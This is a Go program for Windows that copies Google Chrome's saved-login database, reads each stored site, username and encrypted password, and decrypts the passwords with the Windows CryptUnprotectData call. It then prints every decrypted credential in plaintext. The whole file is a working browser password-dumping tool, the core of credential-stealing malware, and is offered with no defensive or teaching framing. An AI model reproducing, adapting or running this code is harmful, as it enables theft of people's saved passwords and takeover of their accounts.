package main

import (
	"database/sql"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"syscall"
	"unsafe"

	sqlite3 "github.com/ccpaging/go-sqlite3-windll"
)

const (
	CRYPTPROTECT_UI_FORBIDDEN = 0x1
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

func CopyFile(sourceFile string, destinationFile string) {
	input, err := ioutil.ReadFile(sourceFile)
	if err != nil {
		fmt.Println(err)
		return
	}

	err = ioutil.WriteFile(destinationFile, input, 0644)
	if err != nil {
		fmt.Println("Error creating", destinationFile)
		fmt.Println(err)
		return
	}

}

func main() {
	log.Printf("Is Windows 64: %v\n", sqlite3.SQLiteWin64)

	file := os.Getenv("LOCALAPPDATA")
	file += "\\Google\\Chrome\\User Data\\Default\\"
	file += "Login Data"

	file2 := os.Getenv("LOCALAPPDATA") + "\\Login Data"

	CopyFile(file, file2)

	db, err := sql.Open("sqlite3", file2)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	rows, err := db.Query("select origin_url,username_value,password_value from logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()
	for rows.Next() {
		var origin_url, username, passwdEncrypt string
		err = rows.Scan(&origin_url, &username, &passwdEncrypt)
		if err != nil {
			log.Fatal(err)
		}
		passwdByte := []byte(passwdEncrypt)
		dataout, _ := Decrypt(passwdByte)
		if username != "" && passwdEncrypt != "" {
			fmt.Print(origin_url, "  ", username, "  ", string(dataout[:]), "\r\n")
		}
	}
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}
